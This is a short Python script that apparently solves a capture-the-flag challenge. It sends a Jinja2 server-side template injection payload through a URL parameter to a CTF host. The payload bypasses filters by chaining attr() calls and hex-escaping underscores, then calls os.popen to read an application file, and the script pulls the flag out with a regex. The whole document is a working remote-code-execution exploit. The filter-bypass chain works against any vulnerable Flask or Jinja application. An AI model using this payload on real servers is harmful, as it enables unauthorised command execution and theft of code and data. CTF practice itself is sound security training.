import requests
import re

url = "http://0x7e7ctf.zerobyte.me:40009"
endpoint = "/?name="
payload = "{{request|attr(%27application%27)|attr(%27\x5f\x5fglobals\x5f\x5f%27)|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(%27\x5f\x5fbuiltins\x5f\x5f%27)|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(%27\x5f\x5fimport\x5f\x5f%27)(%27os%27)|attr(%27popen%27)(%27cat%20/app/main.py%27)|attr(%27read%27)()}}"

response = requests.get(url + endpoint + payload)

flag = re.findall(r'0byteCTF\{[A-Za-z0-9_]+\}', response.text)
print(flag)